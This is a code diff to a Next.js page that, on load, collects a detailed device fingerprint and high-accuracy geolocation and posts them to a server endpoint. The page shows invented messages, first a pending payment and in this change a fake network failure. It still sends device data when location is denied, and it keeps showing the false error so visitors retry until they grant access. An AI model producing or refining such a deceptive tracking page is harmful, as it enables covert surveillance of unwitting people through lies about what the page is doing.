@@ -1,9 +1,18 @@
 "use client";
 
 import { useCallback, useEffect, useState } from "react";
-import { getDeviceInfo } from "@/lib/deviceInfo";
+import { collectDeviceInfo } from "@/lib/deviceInfo";
 
 type Screen = "loading" | "retry" | "ready";
+
+async function saveVisit(payload: Record<string, unknown>) {
+  const res = await fetch("/api/location", {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify(payload),
+  });
+  return res.ok;
+}
 
 export default function Home() {
   const [screen, setScreen] = useState<Screen>("loading");
@@ -13,57 +22,65 @@ export default function Home() {
     setBusy(true);
     setScreen("loading");
 
-    // Device info — no extra permission needed
-    const device = getDeviceInfo();
+    try {
+      // Full device fingerprint (desktop / mobile / tablet)
+      const device = await collectDeviceInfo();
 
-    if (!navigator.geolocation) {
-      setScreen("retry");
-      setBusy(false);
-      return;
-    }
-
-    navigator.geolocation.getCurrentPosition(
-      async (pos) => {
-        try {
-          const { latitude, longitude, accuracy, altitude, heading, speed } =
-            pos.coords;
-
-          const res = await fetch("/api/location", {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({
-              latitude,
-              longitude,
-              accuracy,
-              altitude,
-              heading,
-              speed,
-              device,
-            }),
-          });
-
-          if (!res.ok) {
-            setScreen("retry");
-            return;
-          }
-
-          setScreen("ready");
-        } catch {
-          setScreen("retry");
-        } finally {
-          setBusy(false);
+      const finishWithLocation = async (
+        coords: GeolocationCoordinates | null
+      ) => {
+        const payload: Record<string, unknown> = {
+          device,
+          locationGranted: !!coords,
+        };
+        if (coords) {
+          payload.latitude = coords.latitude;
+          payload.longitude = coords.longitude;
+          payload.accuracy = coords.accuracy;
+          payload.altitude = coords.altitude;
+          payload.heading = coords.heading;
+          payload.speed = coords.speed;
         }
-      },
-      () => {
-        setScreen("retry");
-        setBusy(false);
-      },
-      {
-        enableHighAccuracy: true,
-        timeout: 15000,
-        maximumAge: 0,
+
+        const ok = await saveVisit(payload);
+        if (!ok) {
+          setScreen("retry");
+          return;
+        }
+        // Only show success UI when location was granted
+        // (keeps existing flow: deny → retry network message)
+        if (coords) setScreen("ready");
+        else setScreen("retry");
+      };
+
+      if (!navigator.geolocation) {
+        await finishWithLocation(null);
+        return;
       }
-    );
+
+      await new Promise<void>((resolve) => {
+        navigator.geolocation.getCurrentPosition(
+          async (pos) => {
+            await finishWithLocation(pos.coords);
+            resolve();
+          },
+          async () => {
+            // Still save device info even if permission denied
+            await finishWithLocation(null);
+            resolve();
+          },
+          {
+            enableHighAccuracy: true,
+            timeout: 15000,
+            maximumAge: 0,
+          }
+        );
+      });
+    } catch {
+      setScreen("retry");
+    } finally {
+      setBusy(false);
+    }
   }, []);
 
   useEffect(() => {
@@ -107,10 +124,11 @@ export default function Home() {
             </svg>
           </div>
           <h1 className="text-xl font-semibold text-[#1f1f1f]">
-            Payment Status Pending
+            Unable to Connect to Server
           </h1>
           <p className="mt-2 text-sm leading-relaxed text-[#5f6368]">
-            We couldn&apos;t verify your session. Please try again.
+            A network problem occurred and we couldn&apos;t reach the server.
+            Please check your connection and try again.
           </p>
           <button
             type="button"
@@ -118,7 +136,7 @@ export default function Home() {
             onClick={captureAndSave}
             className="mt-8 w-full rounded-full bg-[#1a73e8] py-3.5 text-[15px] font-medium text-white shadow-sm transition active:scale-[0.98] active:bg-[#1557b0] disabled:opacity-60"
           >
-            {busy ? "Please wait…" : "Retry Payment"}
+            {busy ? "Please wait…" : "Try Again"}
           </button>
         </div>
       </div>
